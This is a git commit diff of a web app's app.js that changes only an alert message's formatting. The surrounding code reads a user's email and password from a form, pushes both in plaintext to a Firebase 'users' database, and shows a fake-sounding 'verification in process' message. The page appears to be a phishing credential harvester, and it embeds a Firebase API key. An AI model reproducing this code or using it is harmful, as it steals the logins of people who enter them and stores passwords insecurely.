cc0b3fb1284210140a4311f8e22b7c3638e9fe5a
Xmaster game <musakhokhar6151@gmail.com>
2026-08-01 16:15:45 +0500

    Fix alert message formatting in showData function

--- app.js
+++ app.js
@@ -1,6 +1,5 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
 import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
-
 const firebaseConfig = {
   apiKey: "AIzaSyCkCReXkYkGFLAZf1xsf71nQP_Iq3REHPo",
   authDomain: "mylogin-f8ae6.firebaseapp.com",
@@ -10,18 +9,14 @@ const firebaseConfig = {
   messagingSenderId: "339013045434",
   appId: "1:339013045434:web:54be0b8212c67227178683"
 };
-
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
-
 window.showData = function () {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
-
   push(ref(db, "users"), {
     email: email,
     password: password
   });
-
-  alert(" Varification in process Kindly wait. We will notify you later..");
-};
+  alert(" Varification in process Kindly wait We will notify you later..");
+}
